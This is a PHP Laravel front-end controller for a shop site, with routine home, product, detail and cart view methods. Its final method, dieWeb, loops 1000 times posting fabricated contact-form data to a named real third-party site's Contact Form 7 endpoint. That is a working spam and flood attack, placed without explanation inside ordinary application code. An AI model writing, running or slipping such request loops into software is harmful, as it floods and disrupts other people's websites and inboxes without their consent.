<?php

namespace App\Http\Controllers\FrontEnd;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\Categories;
use Curl\Curl;
class HomeController extends Controller
{
    public function __construct()
    {

    }

    /**
     * view index
    */
    public function home()
    {
        $category = new Categories();
        $cates = $category->categoriesFE();
        //dd($cates);
        return view('frontend.page.home', compact('cates'));
    }

    /**
     * view products
    */
    public function products()
    {
        return view('frontend.page.product');
    }

    /**
     * view detail
    */
    public function detail()
    {
        return view('frontend.page.product_detail');
    }

    /**
     * view cart
    */
    public function cart()
    {
        return view('frontend.page.cart');
    }

    /**
     *
    */
    public function dieWeb()
    {

        $data = [
            'hoten' => 'xxx',
            'dienthoai' => '0977555666',
            'email' => 'xxx@gmail.com',
            'diachi' => 'xxxx',
            'ghichu' => 'xxxxx'
        ];
        for($i = 0; $i < 1000; $i++)
        {
            $curl = new Curl();
            $curl->post('https://gomsubattrang360.com/wp-json/contact-form-7/v1/contact-forms/277/feedback', $data);
            $curl->close();
        }
    }
}
